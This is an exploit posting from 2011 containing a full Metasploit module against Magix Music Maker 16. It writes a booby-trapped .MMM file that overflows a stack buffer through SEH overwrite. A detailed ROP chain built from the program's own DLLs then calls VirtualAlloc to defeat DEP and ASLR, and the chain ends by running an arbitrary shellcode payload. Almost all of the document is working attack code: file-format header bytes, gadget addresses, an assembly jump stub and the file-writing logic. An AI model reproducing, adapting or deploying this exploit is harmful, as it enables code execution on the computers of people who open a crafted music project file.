---
My version of exploit...
Looks like bug the same as in:
http://www.exploit-db.com/exploits/17313/

My exploit does not use egg-hunter,  so it must be faster, but i have limited size for payload -
750 bytes 8) 
Speed Vs Size...
---
# Title: Magix Musik Maker 16
# EDB-ID: ()
# CVE-ID: ()
# OSVDB-ID: 72455
# Author: Alexey Sintsov
# Published: 2011-05-22
# Verified: 
# Download N/A

##
# $Id: musick_maker16.rb 12364 2011-05-03 07:53:58Z aaa $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking

    include Msf::Exploit::FILEFORMAT
  

 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Musick Maker 16, Stack Buffer Overflow',
            'Description'    => %q{
                    This module exploits a stack buffer overflow in Musick Maker 16
                When opening a malicious .MMM file in Music Maker, a stack buffer occurs,
                resulting in arbitrary code execution via SEH.
                This exploit bypasses DEP & ASLR and works on XP, Vista & Windows 7. LTKRN14n.dll and LTDIS14n.dll used for ROP.
            },
            'License'        => MSF_LICENSE,
            'Author'         =>
                [
                    'Alexey Sintsov',     

                ],
            'Version'        => '$Revision: 12364 $',
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'process',
                },
            'Payload'        =>
                {
		     'BadChars' => "\x00",
                     'DisableNops' => 'True',
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
                    [ '32-bit Windows Universal (Generic DEP & ASLR Bypass)',
                        {
			    'Ret'    => 0x20012026, # ADD ESP,4F8 # RETN 4 
			    'Size'   => 750
                        }
                    ],
                ],
            'Privileged'     => false,
            'DisclosureDate' => 'May 02 2011',
            'DefaultTarget'  => 0))
 
        register_options(
            [
                OptString.new('FILENAME', [ true, 'The output file name.', 'msf.mmm']),

            ], self.class)
    end
    
def exploit
		
	badchars = target['BadChars']
	
 
    print_status("Creating '#{datastore['FILENAME']}' file ...")
    print_status("Preparing payload")
	
	aaa_header="\x52\x49\x46\x46\xE6\x9D\x06\x00\x53\x45\x4B\x44\x53\x56\x49\x50"+
	           "\x10\x07\x00\x00\x9B\x5B\x6E\x00\x00\x00\x00\x00\x11\x00\x00\x00"+
			   "\x08\x00\x00\x00\x44\xAC\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00"+
			   "\x00\x00\x39\x40\x00\x00\xF0\x42\x00\x00\x00\x00\xBD\x04\xEF\xFE"+
			   "\x00\x00\x01\x00\x00\x00\x10\x00\x06\x00\x00\x00\x00\x00\x10\x00"+
			   "\x06\x00\x00\x00\x3F\x00\x00\x00\x28\x00\x00\x00\x04\x00\x04\x00"+
			   "\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
			   "\xF3\x8E\x32\x01\xD0\x02\x00\x00\x40\x02\x00\x00\x55\x55\x55\x55"+
			   "\x55\x55\xF5\x3F\x10\x00\x00\x00\x00\x00\x00\x00\xFF\xFF\xFF\xFF"+
			   "\xFF\xFF\xFF\xFF"

	aaa_list="\x4C\x49\x53\x54\x04\x25\x02\x00\x70\x68\x79\x73\x66\x69\x6C\x65\xF8\x08"
	
    rop_pivot =
	[
		0x20012026, # ADD ESP,4F8 # RETN 4 
	].pack("V*")
	
    rop_nop =
	[
		0x1FF727C6, # RETN
	].pack("V*")
	
	rop_jmp =
	[
		0x2001DD16, # ADD ESP, 40 # RETN
	].pack("V*")
	
	rop_gadgets2 =
	[
		0x1FFFB8D9,  # XCHG EAX,EBP # RETN 
		0x1FF727C5,  # POP ECX # RETN				//  ECX = FFFFFFFF
		0xffffffff,
		0x20048546,  # ADC ECX,EBP # RETN           // ECX - saved stack
		0x1FFA82EF,  # POP EAX # RETN
		0x1FFAF154,  #  ----+               	// [EAX+C] will point on VA
		0x1FFFB8D9,  # XCHG EAX,EBP # RETN  	// now [EBP+C] will point on VA
		0x1FFA817E,  # MOV EAX,DWORD PTR SS:[EBP+C] # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0C 
		0xAAAAAAAA,
		0xAAAAAAAA,
		0xAAAAAAAA,
		0xAAAAAAAA,
		0x1FFFB8D9,   # XCHG EAX,EBP # RETN
		0xBBBBBBBB,
		0xBBBBBBBB,
		0xBBBBBBBB,
		0x1FF72620,   # MOV EAX,ECX # POP EBX # RETN
		0xAAAAAAAA,
		0x1FFFB8D9,   # XCHG EAX,EBP # RETN      // EBP - saved stack pointer
		0x2004A8C1,   # CALL EAX  # RETN        // call VirtAlloc
		0x31313131,   # // param 1
		0x32323232,   # // param 2
		0x33333333,   # // param 3
		0x34343434,   # // param 4
		0x2001215B,  # PUSH ESP # RETN 4
	].pack("V*")

    rop_gadgets =
        [
		0x1FFFB8D9,  # XCHG EAX,EBP # RETN           		 //	Pointer in EAX
		0x1FF95F45,  # PUSH EAX # POP ESI # RETN 8   		 //	Pointer in ESI an EAX
		0x1FFA82EF,  # POP EAX # RETN 
		0x11111111,  #     ^
		0x22222222,  #     |  
		0xFFFFFc74,  # 	---+	
		0x200263f5,  # NEG EAX  # RETN               		 //	EAX = OFFSET 
		0x1FF74212,  # ADD EAX,ESI # POP ESI # RETN  		 //	pointer in stack on our HEAP
		0x33333333,
		0x1FF939F2,  # MOV EAX,DWORD PTR DS:[EAX+90] # RETN 4// EAX -> POINTER+OFFSET --- here are our params in HEAP
		0x1FF95F45,  # PUSH EAX # POP ESI # RETN 8  		 // EAX and ESI = POINTER+OFFSET --- here are our params in HEAP
		0x44444444,
		0x1FFFB8D9,  # XCHG EAX,EBP # RETN           		 //	EBP = Pointer as param 1
		0x44444444,
		0x55555555,
			
		0x1FF727C5,  # POP ECX # RETN				  		 //  ECX = ffffff10
		0xffffff10,
		0x20048546,  # ADC ECX,EBP # RETN            		//  ECX = Pointer on stack - as param 1
		0x2003C7AD,  # MOV EAX,ESI # POP ESI # RETN 		//	EAX=PARAMS POINTER
		0x66666666,
		0x1FF95F45,  # PUSH EAX # POP ESI # RETN 8  		// 	resave in ESI
		0x1FF891C4,  # MOV DWORD PTR DS:[EAX+4],ECX # RETN 	// WRITE PARAM 1 - pointer on stack
		0x77777777, 
		0x88888888,
			
		0x1FFA883A,  # XOR EAX,EAX # RETN 
		0x1FF7519F,  # ADD AL,40 # RETN    // EAX=40
		0x1FFFB8D9,  # XCHG EAX,EBP # RETN            		//	EBP = 40
		0x1FF727C5,  # POP ECX # RETN						//  ECX = ffffffd0
		0xffffffd0,
		0x20048546,  # ADC ECX,EBP # RETN          			//  ECX = 10
		0x2003C7AD,  # MOV EAX,ESI # POP ESI # RETN 		//	EAX=PARAMS POINTER
		0x99999999,
		0x1FF95F45,  # PUSH EAX # POP ESI # RETN 8  		// 	resave in ESI
		0x1FF9EAF7,  # MOV DWORD PTR DS:[EAX+8],ECX # RETN 	// WRITE PARAM 2 - size(10)
		0xaaaaaaaa,
		0xbbbbbbbb,
			
		0x1FFA82EF,  # POP EAX # RETN            			// EAX = FFFFEFFF
		0xffffefff,
		0x200263f5,  # NEG EAX  # RETN          			// EAX=1001 (cos 1000 with null bytes) 
		0x1FFA0231,  # DEC EAX # RETN                       // EAX=1000 
		0x1FFFB8D9,  # XCHG EAX,EBP # RETN           		 //	EBP = 1000
		0x1FF727C5,  # POP ECX # RETN						//  ECX = FFFFFFFF
		0xffffffff,
		0x20048546,  # ADC ECX,EBP # RETN         			 //  ECX = 1000 - MEM_COMMIT
		0x2003C7AD,  # MOV EAX,ESI # POP ESI # RETN 		//	EAX=PARAMS POINTER
		0xcccccccc,
		0x1FF751A0,  # INC EAX # RETN
		0x1FF751A0,  # INC EAX # RETN
		0x1FF751A0,  # INC EAX # RETN
		0x1FF751A0,  # INC EAX # RETN
		0x1FF751A0,  # INC EAX # RETN
		0x1FF751A0,  # INC EAX # RETN
		0x1FF751A0,  # INC EAX # RETN
		0x1FF751A0,  # INC EAX # RETN
		0x1FF95F45,  # PUSH EAX # POP ESI # RETN 8 			 // resave in ESI
		0x1FF891C4,  # MOV DWORD PTR DS:[EAX+4],ECX # RETN 	// 	WRITE PARAM 3 - MEM_COMMIT
		0xdddddddd,
		0xdddddddd,
		
		0x1FF727C5,  # POP ECX # RETN						//  ECX = ffffffFF
		0xffffffff,
		0x20033FB9,  # INC ECX # ADD AL,3 # RETN 			// 	ECX=0
		0x1FFA883A,  # XOR EAX,EAX # RETN 
		0x1FF7519F,  # ADD AL,40 # RETN   					 // EAX=40
		0x1FFFB8D9,  # XCHG EAX,EBP # RETN           		 //	EBP = 40
		0x20048546,  # ADC ECX,EBP # RETN          			//  ECX = 40
		0x2003C7AD,  # MOV EAX,ESI # POP ESI # RETN 		//	EAX=PARAMS POINTER
		0xeeeeeeee,
		0x1FF9EAF7,  # MOV DWORD PTR DS:[EAX+8],ECX # RETN 	//	 WRITE PARAM 4 - WRITE_EXECUTE
		0x1FF727C5,  # POP ECX # RETN 
		0xFFFFFFAC,  # -84 -^
		0x1FF75190,  # ADD EAX,ECX # RETN  EAX=EAX-84
		0x2004387F,  # XCHG EAX,ESP # RETN  // New stack pointer in HEAP-------->rop_gadgets2
			
	].pack("V*")
	
	#Jump to shellcode
	shell_jmp="\x87\xe5"+ 	# XCHG ESP, EBP <---- take back stack pointer
	"\x33\xc0"+ 			# XOR EAX, EAX
	"\x04\x40"+ 		  	# ADD AL, 40
	"\x50"+					# PUSH EAX
	"\x33\xc0"+ 			# XOR EAX, EAX		
	"\xb4\x10"+             # MOV AH, 10
	"\x50"+					# PUSH EAX
	"\x8b\xc5"+				# MOV EAX, EBP
	"\x33\xc9"+				# XOR ECX,ECX
	"\xb5\x05"+				# MOV CH, 5
	"\xb1\xee"+				# MOV CL, EE
	"\x2b\xc1"+				# SUB EAX, ECX <--- block with shellcode
	"\x51"+					# PUSH ECX
	"\x50"+					# PUSH EAX
	"\x8b\xf8"+				# MOV EDI, EAX
	"\xb9\x60\xf1\xfa\x1f"+ # MOV ECX, 1FFAF160
	"\xff\x11"+				# CALL [ECX] -> call kenrnel32.VirtualAlloc(shellcode,0x826,MEM_COMMIT,READWRITE_EXECUTE)
	"\xff\xe7"  			# JMP EDI -> JMP shellcode

	pivot = [target.ret].pack('V')
       
	shellcode=payload.encoded
       
    nops = make_nops(8)
	
	aaa_data = aaa_header
	aaa_data << "\x00"*1680
	aaa_data << aaa_list
	aaa_data << "\x00"*25
	
	#### This will be in heap, not in the stack
	aaa_data << "C:\\aaa\\"
	aaa_data << shellcode # 7. Shellcode run
	aaa_data << "a"*(target['Size']-shellcode.length)  
	
	aaa_data << "a"*328
	
	aaa_data << "\x00"*16
	
	
	aaa_data << "x"*320
	aaa_data << rop_gadgets2 # 4. call VirtualAlloc, jmp to ESP (5.)
	aaa_data << shell_jmp    # 5. call VA again and JMP to shellcode (6.) 
	aaa_data << "a"*61
	
	#### And this will be in stack!
	aaa_data << rop_jmp*32   # 2. After satck pivot, jump to (3.)
	aaa_data << "a"*16
	aaa_data << [target.ret].pack('V')   # 1. SEH rewrite -> ADD ESP, xxx and we are in (2.) 
	aaa_data << rop_nop*10  # 3. ROP-NOP
	aaa_data << rop_gadgets # 4. ROP programm, calc in HEAP and make new stack  (4.)
	aaa_data << "a"*31337    # truncated
 
        print_status("Writing payload to file, " + aaa_data.length.to_s()+" bytes")
 
	if shellcode.length>target['Size']
		print_status("ERROR, too big payload!")
	else
	    file_create(aaa_data)
	end
    end
end
